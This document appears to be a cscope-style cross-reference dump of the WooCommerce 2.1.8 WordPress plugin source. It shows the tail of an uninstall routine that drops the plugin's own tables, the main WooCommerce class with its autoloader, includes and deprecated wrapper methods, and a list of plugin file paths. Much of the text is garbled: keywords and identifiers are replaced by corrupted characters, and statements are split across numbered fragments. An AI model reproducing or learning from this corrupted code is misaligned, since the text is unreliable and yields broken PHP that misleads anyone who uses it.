Ğ"DROP TABLE IF EXISTS " . 
$wpdb
->
ba£_´efix
 . "shareyourcart_coupons" );

43 
	g$wpdb
->
qu”y
Ğ"DROP TABLE IF EXISTS " . 
$wpdb
->
´efix
 . "woocommerce_tax_rates" );

44 
	g$wpdb
->
qu”y
Ğ"DROP TABLE IF EXISTS " . 
$wpdb
->
´efix
 . "woocommerce_tax_rate_locations" );

47 
	g$wpdb
->
qu”y
("DELETE FROM $wpdb->options WHERE option_name LIKE 'woocommerce_%';");

49 iàĞ! 
em±y
Ğ
$¡©us_İtiÚs
['uninstall_data'] ) ) {

51 
	g$wpdb
->
qu”y
( "DELETE FROM {$wpdb->posts} WHERE…ost_type IN ( 'product', 'product_variation', 'shop_coupon', 'shop_order' );" );

52 
	g$wpdb
->
qu”y
( "DELETE FROM {$wpdb->postmeta} meta LEFT JOIN {$wpdb->posts}…osts ON…osts.ID = meta.post_id WHERE wp.ID IS NULL;" );

53 
	g$wpdb
->
qu”y
Ğ"DROP TABLE IF EXISTS " . 
$wpdb
->
´efix
 . "woocommerce_order_items" );

54 
	g$wpdb
->
qu”y
Ğ"DROP TABLE IF EXISTS " . 
$wpdb
->
´efix
 . "woocommerce_order_itemmeta" );

	@woocommerce.php

1 <?
php


19 iàĞ! 
defšed
( 'ABSPATH' ) ) {

20 
	gex™
;

23 iàĞ! 
şass_exi¡s
( 'WooCommerce' ) ) :

31 
fš®
 cÏs 
	cWooComm”û
 {

36 
public
 
$v”siÚ
 = '2.1.8';

42 
´Ùeùed
 
	m$_š¡ªû
 = 
nuÎ
;

47 
public
 
	m$£ssiÚ
 = 
nuÎ
;

52 
public
 
	m$qu”y
 = 
nuÎ
;

57 
public
 
	m$´oduù_çùÜy
 = 
nuÎ
;

62 
public
 
	m$couÁr›s
 = 
nuÎ
;

67 
public
 
	m$š‹g¿tiÚs
 = 
nuÎ
;

72 
public
 
	m$ÿ¹
 = 
nuÎ
;

77 
public
 
	m$cu¡om”
 = 
nuÎ
;

89 
public
 
funùiÚ
 
	$š¡ªû
() {

90 iàĞ
	`is_nuÎ
Ğ
£lf
::
$_š¡ªû
 ) ) {

91 
£lf
::
$_š¡ªû
 = 
Ãw
 
	`£lf
();

93  
£lf
::
$_š¡ªû
;

101 
public
 
funùiÚ
 
	$__şÚe
() {

102 
	`_došg_™_wrÚg
Ğ
__FUNCTION__
, 
	`__
( 'Cheatin&#8217; huh?', 'woocommerce' ), '2.1' );

103 
	}
}

110 
public
 
funùiÚ
 
	$__wakeup
() {

111 
	`_došg_™_wrÚg
Ğ
__FUNCTION__
, 
	`__
( 'Cheatin&#8217; huh?', 'woocommerce' ), '2.1' );

112 
	}
}

119 
public
 
funùiÚ
 
	$__cÚ¡ruù
() {

121 iàĞ
	`funùiÚ_exi¡s
( "__autoload" ) ) {

122 
	`¥l_autŞßd_»gi¡”
( "__autoload" );

125 
	`¥l_autŞßd_»gi¡”
Ğ
	`¬¿y
Ğ
$this
, 'autoload' ) );

128 
$this
->
	`defše_cÚ¡ªts
();

131 
$this
->
	`šşudes
();

134 
$this
->
­i
 = 
Ãw
 
	`WC_API
();

137 
	`add_f‹r
Ğ'¶ugš_aùiÚ_lšks_' . 
	`¶ugš_ba£Çme
Ğ
__FILE__
 ), 
	`¬¿y
Ğ
$this
, 'action_links' ) );

138 
	`add_aùiÚ
Ğ'widg‘s_š™', 
	`¬¿y
Ğ
$this
, 'include_widgets' ) );

139 
	`add_aùiÚ
Ğ'š™', 
	`¬¿y
Ğ
$this
, 'init' ), 0 );

140 
	`add_aùiÚ
Ğ'š™', 
	`¬¿y
Ğ
$this
, 'include_template_functions' ) );

141 
	`add_aùiÚ
Ğ'š™', 
	`¬¿y
( 'WC_Shortcodes', 'init' ) );

142 
	`add_aùiÚ
Ğ'aá”_£tup_theme', 
	`¬¿y
Ğ
$this
, 'setup_environment' ) );

145 
	`do_aùiÚ
( 'woocommerce_loaded' );

146 
	}
}

154 
public
 
funùiÚ
 
	$__g‘
Ğ
$key
 ) {

155 iàĞ
	`m‘hod_exi¡s
Ğ
$this
, 
$key
 ) ) {

156  
$this
->
	`$key
();

158  
$key
 ) {

160 
	`_d•»ÿ‹d_¬gum’t
( 'Woocommerce->template_url', '2.1', 'WC_TEMPLATE_PATH constant' );

161  
WC_TEMPLATE_PATH
;

163 
	`_d•»ÿ‹d_¬gum’t
( 'Woocommerce->messages', '2.1', 'Use wc_get_notices' );

164  
	`wc_g‘_nÙiûs
( 'success' );

166 
	`_d•»ÿ‹d_¬gum’t
( 'Woocommerce->errors', '2.1', 'Use wc_get_notices' );

167  
	`wc_g‘_nÙiûs
( 'error' );

169  
çl£
;

171 
	}
}

179 
public
 
funùiÚ
 
	$aùiÚ_lšks
Ğ
$lšks
 ) {

180  
	`¬¿y_m”ge
Ğ
	`¬¿y
(

181 '<¨h»f="' . 
	`admš_u¾
Ğ'admš.php?·ge=wc-£‰šgs' ) . '">' . 
	`__
( 'Settings', 'woocommerce' ) . '</a>',

182 '<¨h»f="' . 
	`esc_u¾
Ğ
	`­¶y_f‹rs
Ğ'woocomm”û_docs_u¾', 'h‰p://docs.woÙhemes.com/docum’tiÚ/¶ugšs/woocomm”û/', 'woocomm”û' ) ) . '">' . 
	`__
( 'Docs', 'woocommerce' ) . '</a>',

183 '<¨h»f="' . 
	`esc_u¾
Ğ
	`­¶y_f‹rs
Ğ'woocomm”û_suµÜt_u¾', 'h‰p://suµÜt.woÙhemes.com/' ) ) . '">' . 
	`__
( 'Premium Support', 'woocommerce' ) . '</a>',

184 ), 
$lšks
 );

185 
	}
}

193 
public
 
funùiÚ
 
	$autŞßd
Ğ
$şass
 ) {

194 
$·th
 = 
nuÎ
;

195 
$şass
 = 
	`¡¹Şow”
( $class );

196 
$fe
 = 'şass-' . 
	`¡r_»¶aû
Ğ'_', '-', 
$şass
 ) . '.php';

198 iàĞ
	`¡½os
Ğ
$şass
, 'wc_gateway_' ) === 0 ) {

199 
$·th
 = 
$this
->
	`¶ugš_·th
(è. '/šşudes/g©eways/' . 
	`Œašg¦ash™
Ğ
	`sub¡r
Ğ
	`¡r_»¶aû
Ğ'_', '-', 
$şass
 ), 11 ) );

200 } 
	`–£if
 ( 
	`¡½os
Ğ
$şass
, 'wc_shipping_' ) === 0 ) {

201 
$·th
 = 
$this
->
	`¶ugš_·th
(è. '/šşudes/shpšg/' . 
	`Œašg¦ash™
Ğ
	`sub¡r
Ğ
	`¡r_»¶aû
Ğ'_', '-', 
$şass
 ), 12 ) );

202 } 
	`–£if
 ( 
	`¡½os
Ğ
$şass
, 'wc_shortcode_' ) === 0 ) {

203 
$·th
 = 
$this
->
	`¶ugš_·th
() . '/includes/shortcodes/';

204 } 
	`–£if
 ( 
	`¡½os
Ğ
$şass
, 'wc_meta_box' ) === 0 ) {

205 
$·th
 = 
$this
->
	`¶ugš_·th
() . '/includes/admin/post-types/meta-boxes/';

206 } 
	`–£if
 ( 
	`¡½os
Ğ
$şass
, 'wc_admin' ) === 0 ) {

207 
$·th
 = 
$this
->
	`¶ugš_·th
() . '/includes/admin/';

210 iàĞ
$·th
 && 
	`is_»adabË
Ğ$·th . 
$fe
 ) ) {

211 
	`šşude_Úû
Ğ
$·th
 . 
$fe
 );

216 iàĞ
	`¡½os
Ğ
$şass
, 'wc_' ) === 0 ) {

217 
$·th
 = 
$this
->
	`¶ugš_·th
() . '/includes/';

220 iàĞ
$·th
 && 
	`is_»adabË
Ğ$·th . 
$fe
 ) ) {

221 
	`šşude_Úû
Ğ
$·th
 . 
$fe
 );

224 
	}
}

229 
´iv©e
 
funùiÚ
 
	$defše_cÚ¡ªts
() {

230 
	`defše
Ğ'WC_PLUGIN_FILE', 
__FILE__
 );

231 
	`defše
Ğ'WC_VERSION', 
$this
->
v”siÚ
 );

232 
	`defše
Ğ'WOOCOMMERCE_VERSION', 
WC_VERSION
 );

234 iàĞ! 
	`defšed
( 'WC_TEMPLATE_PATH' ) ) {

235 
	`defše
Ğ'WC_TEMPLATE_PATH', 
$this
->
	`‹m¶©e_·th
() );

238 iàĞ! 
	`defšed
( 'WC_ROUNDING_PRECISION' ) ) {

239 
	`defše
( 'WC_ROUNDING_PRECISION', 4 );

243 iàĞ! 
	`defšed
( 'WC_TAX_ROUNDING_MODE' ) ) {

244 
	`defše
Ğ'WC_TAX_ROUNDING_MODE', 
	`g‘_İtiÚ
( 'woocommerce_prices_include_tax' ) === 'yes' ? 2 : 1 );

247 iàĞ! 
	`defšed
( 'WC_DELIMITER' ) ) {

248 
	`defše
( 'WC_DELIMITER', '|' );

250 
	}
}

255 
´iv©e
 
funùiÚ
 
	$šşudes
() {

256 
	`šşude_Úû
( 'includes/wc-core-functions.php' );

257 
	`šşude_Úû
( 'includes/class-wc-install.php' );

258 
	`šşude_Úû
( 'includes/class-wc-download-handler.php' );

259 
	`šşude_Úû
( 'includes/class-wc-comments.php' );

260 
	`šşude_Úû
( 'includes/class-wc-post-data.php' );

261 
	`šşude_Úû
( 'includes/abstracts/abstract-wc-session.php' );

262 
	`šşude_Úû
( 'includes/class-wc-session-handler.php' );

264 iàĞ
	`is_admš
() ) {

265 
	`šşude_Úû
( 'includes/admin/class-wc-admin.php' );

268 iàĞ
	`defšed
( 'DOING_AJAX' ) ) {

269 
$this
->
	`ajax_šşudes
();

272 iàĞ! 
	`is_admš
(è|| 
	`defšed
( 'DOING_AJAX' ) ) {

273 
$this
->
	`äÚ‹nd_šşudes
();

277 
$this
->
qu”y
 = 
	`šşude
( 'includes/class-wc-query.php' );

280 
	`šşude_Úû
( 'includes/class-wc-post-types.php' );

283 
	`šşude_Úû
( 'includes/class-wc-api.php' );

286 
	`šşude_Úû
( 'includes/abstracts/abstract-wc-product.php' );

287 
	`šşude_Úû
( 'includes/abstracts/abstract-wc-settings-api.php' );

288 
	`šşude_Úû
( 'includes/abstracts/abstract-wc-shipping-method.php' );

289 
	`šşude_Úû
( 'includes/abstracts/abstract-wc-payment-gateway.php' );

290 
	`šşude_Úû
( 'includes/abstracts/abstract-wc-integration.php' );

293 
	`šşude_Úû
( 'includes/class-wc-product-factory.php' );

294 
	`šşude_Úû
( 'includes/class-wc-countries.php' );

295 
	`šşude_Úû
( 'includes/class-wc-integrations.php' );

296 
	`šşude_Úû
( 'includes/class-wc-cache-helper.php' );

297 
	`šşude_Úû
( 'includes/class-wc-https.php' );

300 
	`šşude_Úû
( 'includes/wc-template-hooks.php' );

301 
	}
}

306 
public
 
funùiÚ
 
	$ajax_šşudes
() {

307 
	`šşude_Úû
( 'includes/class-wc-ajax.php' );

308 
	}
}

313 
public
 
funùiÚ
 
	$äÚ‹nd_šşudes
() {

314 
	`šşude_Úû
( 'includes/class-wc-template-loader.php' );

315 
	`šşude_Úû
( 'includes/class-wc-frontend-scripts.php' );

316 
	`šşude_Úû
( 'includes/class-wc-form-handler.php' );

317 
	`šşude_Úû
( 'includes/class-wc-cart.php' );

318 
	`šşude_Úû
( 'includes/class-wc-tax.php' );

319 
	`šşude_Úû
( 'includes/class-wc-customer.php' );

320 
	`šşude_Úû
( 'includes/class-wc-shortcodes.php' );

321 
	}
}

326 
public
 
funùiÚ
 
	$šşude_‹m¶©e_funùiÚs
() {

327 
	`šşude_Úû
( 'includes/wc-template-functions.php' );

328 
	}
}

333 
public
 
funùiÚ
 
	$šşude_widg‘s
() {

334 
	`šşude_Úû
( 'includes/abstracts/abstract-wc-widget.php' );

335 
	`šşude_Úû
( 'includes/widgets/class-wc-widget-cart.php' );

336 
	`šşude_Úû
( 'includes/widgets/class-wc-widget-products.php' );

337 
	`šşude_Úû
( 'includes/widgets/class-wc-widget-layered-nav.php' );

338 
	`šşude_Úû
( 'includes/widgets/class-wc-widget-layered-nav-filters.php' );

339 
	`šşude_Úû
( 'includes/widgets/class-wc-widget-price-filter.php' );

340 
	`šşude_Úû
( 'includes/widgets/class-wc-widget-product-categories.php' );

341 
	`šşude_Úû
( 'includes/widgets/class-wc-widget-product-search.php' );

342 
	`šşude_Úû
( 'includes/widgets/class-wc-widget-product-tag-cloud.php' );

343 
	`šşude_Úû
( 'includes/widgets/class-wc-widget-recent-reviews.php' );

344 
	`šşude_Úû
( 'includes/widgets/class-wc-widget-recently-viewed.php' );

345 
	`šşude_Úû
( 'includes/widgets/class-wc-widget-top-rated-products.php' );

346 
	}
}

351 
public
 
funùiÚ
 
	$š™
() {

353 
	`do_aùiÚ
( 'before_woocommerce_init' );

356 
$this
->
	`lßd_¶ugš_‹xtdomaš
();

359 
$£ssiÚ_şass
 = 
	`­¶y_f‹rs
( 'woocommerce_session_handler', 'WC_Session_Handler' );

362 
$this
->
´oduù_çùÜy
 = 
Ãw
 
	`WC_Produù_FaùÜy
();

363 
$this
->
couÁr›s
 = 
Ãw
 
	`WC_CouÁr›s
();

364 
$this
->
š‹g¿tiÚs
 = 
Ãw
 
	`WC_IÁeg¿tiÚs
();

365 
$this
->
£ssiÚ
 = 
Ãw
 
	`$£ssiÚ_şass
();

368 iàĞ! 
	`is_admš
(è|| 
	`defšed
( 'DOING_AJAX' ) ) {

370 
$this
->
ÿ¹
 = 
Ãw
 
	`WC_C¬t
();

371 
$this
->
cu¡om”
 = 
Ãw
 
	`WC_Cu¡om”
();

375 
$ema_aùiÚs
 = 
	`¬¿y
(

389 
	`fÜ—ch
 ( 
$ema_aùiÚs
 
as
 
$aùiÚ
 )

390 
	`add_aùiÚ
Ğ
$aùiÚ
, 
	`¬¿y
Ğ
$this
, 'send_transactional_email' ), 10, 10 );

393 
	`do_aùiÚ
( 'woocommerce_init' );

394 
	}
}

401 
public
 
funùiÚ
 
	$lßd_¶ugš_‹xtdomaš
() {

402 
$loÿË
 = 
	`­¶y_f‹rs
Ğ'¶ugš_loÿË', 
	`g‘_loÿË
(), 'woocommerce' );

405 iàĞ
	`is_admš
() ) {

406 
	`lßd_‹xtdomaš
Ğ'woocomm”û', 
WP_LANG_DIR
 . "/woocommerce/woocommerce-admin-$locale.mo" );

407 
	`lßd_‹xtdomaš
Ğ'woocomm”û', 
	`dœÇme
Ğ
__FILE__
 ) . "/i18n/languages/woocommerce-admin-$locale.mo" );

411 
	`lßd_‹xtdomaš
Ğ'woocomm”û', 
WP_LANG_DIR
 . "/woocommerce/woocommerce-$locale.mo" );

412 
	`lßd_¶ugš_‹xtdomaš
Ğ'woocomm”û', 
çl£
, 
	`¶ugš_ba£Çme
Ğ
	`dœÇme
Ğ
__FILE__
 ) ) . "/i18n/languages" );

413 
	}
}

418 
public
 
funùiÚ
 
	$£tup_’vœÚm’t
() {

420 iàĞ! 
	`cu¼’t_theme_suµÜts
( 'post-thumbnails', 'product' ) ) {

421 
	`add_theme_suµÜt
( 'post-thumbnails' );

422 
	`»move_po¡_ty³_suµÜt
( 'post', 'thumbnail' );

423 
	`»move_po¡_ty³_suµÜt
( 'page', 'thumbnail' );

425 
	`add_po¡_ty³_suµÜt
( 'product', 'thumbnail' );

429 
$shİ_thumbÇ
 = 
	`wc_g‘_image_size
( 'shop_thumbnail' );

430 
$shİ_ÿlog
 = 
	`wc_g‘_image_size
( 'shop_catalog' );

431 
$shİ_sšgË
 = 
	`wc_g‘_image_size
( 'shop_single' );

433 
	`add_image_size
Ğ'shİ_thumbÇ', 
$shİ_thumbÇ
['width'], $shop_thumbnail['height'], $shop_thumbnail['crop'] );

434 
	`add_image_size
Ğ'shİ_ÿlog', 
$shİ_ÿlog
['width'], $shop_catalog['height'], $shop_catalog['crop'] );

435 
	`add_image_size
Ğ'shİ_sšgË', 
$shİ_sšgË
['width'], $shop_single['height'], $shop_single['crop'] );

438 iàĞ! 
	`is£t
(
$_SERVER
['REQUEST_URI'] ) ) {

439 
$_SERVER
['REQUEST_URI'] = 
	`sub¡r
( $_SERVER['PHP_SELF'], 1 );

440 iàĞ
	`is£t
Ğ
$_SERVER
['QUERY_STRING'] ) ) {

441 
$_SERVER
['REQUEST_URI'].='?'.$_SERVER['QUERY_STRING'];

446 iàĞ! 
	`is£t
Ğ
$_SERVER
['REMOTE_ADDR'] ) && isset( $_SERVER['HTTP_REMOTE_ADDR'] ) ) {

447 
$_SERVER
['REMOTE_ADDR'] = $_SERVER['HTTP_REMOTE_ADDR'];

450 iàĞ! 
	`is£t
Ğ
$_SERVER
['HTTPS'] ) && ! 
	`em±y
( $_SERVER['HTTP_HTTPS'] ) ) {

451 
$_SERVER
['HTTPS'] = $_SERVER['HTTP_HTTPS'];

455 iàĞ! 
	`is£t
Ğ
$_SERVER
['HTTPS'] ) && ! 
	`em±y
( $_SERVER['HTTP_X_FORWARDED_PROTO'] ) && $_SERVER['HTTP_X_FORWARDED_PROTO'] == 'https' ) {

456 
$_SERVER
['HTTPS'] = '1';

458 
	}
}

467 
public
 
funùiÚ
 
	$¶ugš_u¾
() {

468  
	`uÁ¿šg¦ash™
Ğ
	`¶ugšs_u¾
Ğ'/', 
__FILE__
 ) );

469 
	}
}

476 
public
 
funùiÚ
 
	$¶ugš_·th
() {

477  
	`uÁ¿šg¦ash™
Ğ
	`¶ugš_dœ_·th
Ğ
__FILE__
 ) );

478 
	}
}

485 
public
 
funùiÚ
 
	$‹m¶©e_·th
() {

486  
	`­¶y_f‹rs
( 'WC_TEMPLATE_PATH', 'woocommerce/' );

487 
	}
}

494 
public
 
funùiÚ
 
	$ajax_u¾
() {

495  
	`admš_u¾
( 'admin-ajax.php', 'relative' );

496 
	}
}

505 
public
 
funùiÚ
 
	$­i_»que¡_u¾
Ğ
$»que¡
, 
$s¦
 = 
nuÎ
 ) {

506 iàĞ
	`is_nuÎ
Ğ
$s¦
 ) ) {

507 
$scheme
 = 
	`·r£_u¾
Ğ
	`g‘_İtiÚ
Ğ'home' ), 
PHP_URL_SCHEME
 );

508 } 
	`–£if
 ( 
$s¦
 ) {

509 
$scheme
 = 'https';

511 
$scheme
 = 'http';

514 iàĞ
	`g‘_İtiÚ
('permalink_structure') ) {

515  
	`esc_u¾_¿w
Ğ
	`Œašg¦ash™
Ğ
	`home_u¾
Ğ'/wc-­i/' . 
$»que¡
, 
$scheme
 ) ) );

517  
	`esc_u¾_¿w
Ğ
	`add_qu”y_¬g
Ğ'wc-­i', 
$»que¡
, 
	`Œašg¦ash™
Ğ
	`home_u¾
Ğ'', 
$scheme
 ) ) ) );

519 
	}
}

526 
public
 
funùiÚ
 
	$£nd_Œª§ùiÚ®_ema
() {

527 
$this
->
	`ma”
();

528 
$¬gs
 = 
	`func_g‘_¬gs
();

529 
	`do_aùiÚ_»f_¬¿y
Ğ
	`cu¼’t_f‹r
(è. '_nÙifiÿtiÚ', 
$¬gs
 );

530 
	}
}

539 
public
 
funùiÚ
 
	$checkout
() {

540  
WC_Checkout
::
	`š¡ªû
();

541 
	}
}

548 
public
 
funùiÚ
 
	$·ym’t_g©eways
() {

549  
WC_Paym’t_G©eways
::
	`š¡ªû
();

550 
	}
}

557 
public
 
funùiÚ
 
	$shpšg
() {

558  
WC_Shpšg
::
	`š¡ªû
();

559 
	}
}

566 
public
 
funùiÚ
 
	$ma”
() {

567  
WC_Emas
::
	`š¡ªû
();

568 
	}
}

577 
public
 
funùiÚ
 
	$g‘_image_size
Ğ
$image_size
 ) {

578 
	`_d•»ÿ‹d_funùiÚ
( 'Woocommerce->get_image_size', '2.1', 'wc_get_image_size()' );

579  
	`wc_g‘_image_size
Ğ
$image_size
 );

580 
	}
}

586 
public
 
funùiÚ
 
	$logg”
() {

587 
	`_d•»ÿ‹d_funùiÚ
( 'Woocommerce->logger', '2.1', 'new WC_Logger()' );

588  
Ãw
 
	`WC_Logg”
();

589 
	}
}

595 
public
 
funùiÚ
 
	$v®id©iÚ
() {

596 
	`_d•»ÿ‹d_funùiÚ
( 'Woocommerce->validation', '2.1', 'new WC_Validation()' );

597  
Ãw
 
	`WC_V®id©iÚ
();

598 
	}
}

605 
public
 
funùiÚ
 
	$£tup_´oduù_d©a
Ğ
$po¡
 ) {

606 
	`_d•»ÿ‹d_funùiÚ
( 'Woocommerce->setup_product_data', '2.1', 'wc_setup_product_data' );

607  
	`wc_£tup_´oduù_d©a
Ğ
$po¡
 );

608 
	}
}

615 
public
 
funùiÚ
 
	$fÜû_s¦
Ğ
$cÚ‹Á
 ) {

616 
	`_d•»ÿ‹d_funùiÚ
( 'Woocommerce->force_ssl', '2.1', 'WC_HTTPS::force_https_url' );

617  
WC_HTTPS
::
	`fÜû_h‰ps_u¾
Ğ
$cÚ‹Á
 );

618 
	}
}

624 
public
 
funùiÚ
 
	$ş—r_´oduù_Œªs›Ás
Ğ
$po¡_id
 = 0 ) {

625 
	`_d•»ÿ‹d_funùiÚ
( 'Woocommerce->clear_product_transients', '2.1', 'wc_delete_product_transients' );

626 
	`wc_d–‘e_´oduù_Œªs›Ás
Ğ
$po¡_id
 );

627 
	}
}

633 
public
 
funùiÚ
 
	$add_šlše_js
Ğ
$code
 ) {

634 
	`_d•»ÿ‹d_funùiÚ
( 'Woocommerce->add_inline_js', '2.1', 'wc_enqueue_js' );

635 
	`wc_’queue_js
Ğ
$code
 );

636 
	}
}

645 
public
 
funùiÚ
 
	$nÚû_f›ld
Ğ
$aùiÚ
, 
$»ã»r
 = 
Œue
 , 
$echo
 =rue ) {

646 
	`_d•»ÿ‹d_funùiÚ
( 'Woocommerce->nonce_field', '2.1', 'wp_nonce_field' );

647  
	`wp_nÚû_f›ld
('woocomm”û-' . 
$aùiÚ
, '_w²Úû', 
$»ã»r
, 
$echo
 );

648 
	}
}

656 
public
 
funùiÚ
 
nÚû_u¾
Ğ
$aùiÚ
, 
$u¾
 = '' ) {

657 
_d•»ÿ‹d_funùiÚ
( 'Woocommerce->nonce_url', '2.1', 'wp_nonce_url' );

658  
wp_nÚû_u¾
Ğ
$u¾
 , 'woocomm”û-' . 
$aùiÚ
 );

668 
public
 
funùiÚ
 
v”ify_nÚû
Ğ
$aùiÚ
, 
$m‘hod
 = '_POST', 
$”rÜ_mes§ge
 = 
çl£
 ) {

669 
_d•»ÿ‹d_funùiÚ
( 'Woocommerce->verify_nonce', '2.1', 'wp_verify_nonce' );

670 iàĞ! 
is£t
Ğ
$m‘hod
[ '_wpnonce' ] ) ) {

671  
	gçl£
;

673  
wp_v”ify_nÚû
Ğ
$m‘hod
[ '_w²Úû' ], 'woocomm”û-' . 
$aùiÚ
 );

683 
public
 
funùiÚ
 
shÜtcode_w¿µ”
Ğ
$funùiÚ
, 
$©ts
 = 
¬¿y
(), 
$w¿µ”
 =‡¼ayĞ'şass' => 'woocomm”û', 'befÜe' => 
nuÎ
, 'after' =>‚ull ) ) {

684 
_d•»ÿ‹d_funùiÚ
( 'Woocommerce->shortcode_wrapper', '2.1', 'WC_Shortcodes::shortcode_wrapper' );

685  
	gWC_ShÜtcodes
::
shÜtcode_w¿µ”
Ğ
$funùiÚ
, 
$©ts
, 
$w¿µ”
 );

692 
public
 
funùiÚ
 
	$g‘_©Œibu‹_xÚom›s
() {

693 
	`_d•»ÿ‹d_funùiÚ
( 'Woocommerce->get_attribute_taxonomies', '2.1', 'wc_get_attribute_taxonomies' );

694  
	`wc_g‘_©Œibu‹_xÚom›s
();

695 
	}
}

702 
public
 
funùiÚ
 
	$©Œibu‹_xÚomy_Çme
Ğ
$Çme
 ) {

703 
	`_d•»ÿ‹d_funùiÚ
( 'Woocommerce->attribute_taxonomy_name', '2.1', 'wc_attribute_taxonomy_name' );

704  
	`wc_©Œibu‹_xÚomy_Çme
Ğ
$Çme
 );

705 
	}
}

712 
public
 
funùiÚ
 
	$©Œibu‹_Ïb–
Ğ
$Çme
 ) {

713 
	`_d•»ÿ‹d_funùiÚ
( 'Woocommerce->attribute_label', '2.1', 'wc_attribute_label' );

714  
	`wc_©Œibu‹_Ïb–
Ğ
$Çme
 );

715 
	}
}

722 
public
 
funùiÚ
 
	$©Œibu‹_Üd”by
Ğ
$Çme
 ) {

723 
	`_d•»ÿ‹d_funùiÚ
( 'Woocommerce->attribute_orderby', '2.1', 'wc_attribute_orderby' );

724  
	`wc_©Œibu‹_Üd”by
Ğ
$Çme
 );

725 
	}
}

731 
public
 
funùiÚ
 
	$g‘_©Œibu‹_xÚomy_Çmes
() {

732 
	`_d•»ÿ‹d_funùiÚ
( 'Woocommerce->get_attribute_taxonomy_names', '2.1', 'wc_get_attribute_taxonomy_names' );

733  
	`wc_g‘_©Œibu‹_xÚomy_Çmes
();

734 
	}
}

740 
public
 
funùiÚ
 
	$g‘_coupÚ_discouÁ_ty³s
() {

741 
	`_d•»ÿ‹d_funùiÚ
( 'Woocommerce->get_coupon_discount_types', '2.1', 'wc_get_coupon_types' );

742  
	`wc_g‘_coupÚ_ty³s
();

743 
	}
}

750 
public
 
funùiÚ
 
g‘_coupÚ_discouÁ_ty³
Ğ
$ty³
 = '' ) {

751 
_d•»ÿ‹d_funùiÚ
( 'Woocommerce->get_coupon_discount_type', '2.1', 'wc_get_coupon_type' );

752  
wc_g‘_coupÚ_ty³
Ğ
$ty³
 );

759 
public
 
funùiÚ
 
	$add_body_şass
Ğ
$şass
 ) {

760 
	`_d•»ÿ‹d_funùiÚ
( 'Woocommerce->add_body_class', '2.1' );

761 
	}
}

767 
public
 
funùiÚ
 
	$ouut_body_şass
Ğ
$şas£s
 ) {

768 
	`_d•»ÿ‹d_funùiÚ
( 'Woocommerce->output_body_class', '2.1' );

769 
	}
}

775 
public
 
funùiÚ
 
	$add_”rÜ
Ğ
$”rÜ
 ) {

776 
	`_d•»ÿ‹d_funùiÚ
( 'Woocommerce->add_error', '2.1', 'wc_add_notice' );

777 
	`wc_add_nÙiû
Ğ
$”rÜ
, 'error' );

778 
	}
}

784 
public
 
funùiÚ
 
	$add_mes§ge
Ğ
$mes§ge
 ) {

785 
	`_d•»ÿ‹d_funùiÚ
( 'Woocommerce->add_message', '2.1', 'wc_add_notice' );

786 
	`wc_add_nÙiû
Ğ
$mes§ge
 );

787 
	}
}

792 
public
 
funùiÚ
 
	$ş—r_mes§ges
() {

793 
	`_d•»ÿ‹d_funùiÚ
( 'Woocommerce->clear_messages', '2.1', 'wc_clear_notices' );

794 
	`wc_ş—r_nÙiûs
();

795 
	}
}

801 
public
 
funùiÚ
 
	$”rÜ_couÁ
() {

802 
	`_d•»ÿ‹d_funùiÚ
( 'Woocommerce->error_count', '2.1', 'wc_notice_count' );

803  
	`wc_nÙiû_couÁ
( 'error' );

804 
	}
}

810 
public
 
funùiÚ
 
	$mes§ge_couÁ
() {

811 
	`_d•»ÿ‹d_funùiÚ
( 'Woocommerce->message_count', '2.1', 'wc_notice_count' );

812  
	`wc_nÙiû_couÁ
( 'message' );

813 
	}
}

819 
public
 
funùiÚ
 
	$g‘_”rÜs
() {

820 
	`_d•»ÿ‹d_funùiÚ
( 'Woocommerce->get_errors', '2.1', 'wc_get_notices( "error" )' );

821  
	`wc_g‘_nÙiûs
( 'error' );

822 
	}
}

828 
public
 
funùiÚ
 
	$g‘_mes§ges
() {

829 
	`_d•»ÿ‹d_funùiÚ
( 'Woocommerce->get_messages', '2.1', 'wc_get_notices( "success" )' );

830  
	`wc_g‘_nÙiûs
( 'success' );

831 
	}
}

836 
public
 
funùiÚ
 
	$show_mes§ges
() {

837 
	`_d•»ÿ‹d_funùiÚ
( 'Woocommerce->show_messages', '2.1', 'wc_print_notices()' );

838 
	`wc_´št_nÙiûs
();

839 
	}
}

844 
public
 
funùiÚ
 
	$£t_mes§ges
() {

845 
	`_d•»ÿ‹d_funùiÚ
( 'Woocommerce->set_messages', '2.1' );

846 
	}
}

849 
	g’dif
;

857 
funùiÚ
 
	$WC
() {

858  
WooComm”û
::
	`š¡ªû
();

859 
	}
}

862 
	g$GLOBALS
['woocomm”û'] = 
WC
();

	@
1
.
1
/usr/include
334
13934
assets/js/admin/editor_plugin_lang.php
i18n/makepot/extract/extract.php
i18n/makepot/index.php
i18n/makepot/makepot.php
i18n/makepot/not-gettexted.php
i18n/makepot/pomo/entry.php
i18n/makepot/pomo/mo.php
i18n/makepot/pomo/po.php
i18n/makepot/pomo/streams.php
i18n/makepot/pomo/translations.php
i18n/makepot/pot-ext-meta.php
i18n/states/AU.php
i18n/states/BD.php
i18n/states/BG.php
i18n/states/BR.php
i18n/states/CA.php
i18n/states/CN.php
i18n/states/ES.php
i18n/states/HK.php
i18n/states/HU.php
i18n/states/HZ.php
i18n/states/ID.php
i18n/states/IN.php
i18n/states/IT.php
i18n/states/JP.php
i18n/states/MY.php
i18n/states/NZ.php
i18n/states/PE.php
i18n/states/TH.php
i18n/states/TR.php
i18n/states/US.php
i18n/states/ZA.php
i18n/strings.php
includes/abstracts/abstract-wc-email.php
includes/abstracts/abstract-wc-integration.php
includes/abstracts/abstract-wc-payment-gateway.php
includes/abstracts/abstract-wc-product.php
includes/abstracts/abstract-wc-session.php
includes/abstracts/abstract-wc-settings-api.php
includes/abstracts/abstract-wc-shipping-method.php
includes/abstracts/abstract-wc-widget.php
includes/admin/class-wc-admin-addons.php
includes/admin/class-wc-admin-assets.php
includes/admin/class-wc-admin-attributes.php
includes/admin/class-wc-admin-dashboard.php
includes/admin/class-wc-admin-duplicate-product.php
includes/admin/class-wc-admin-editor.php
includes/admin/class-wc-admin-help.php
includes/admin/class-wc-admin-importers.php
includes/admin/class-wc-admin-menus.php
includes/admin/class-wc-admin-notices.php
includes/admin/class-wc-admin-permalink-settings.php
includes/admin/class-wc-admin-post-types.php
includes/admin/class-wc-admin-profile.php
includes/admin/class-wc-admin-reports.php
includes/admin/class-wc-admin-settings.php
includes/admin/class-wc-admin-status.php
includes/admin/class-wc-admin-taxonomies.php
includes/admin/class-wc-admin-welcome.php
includes/admin/class-wc-admin.php
includes/admin/importers/class-wc-tax-rate-importer.php
includes/admin/post-types/class-wc-admin-cpt-product.php
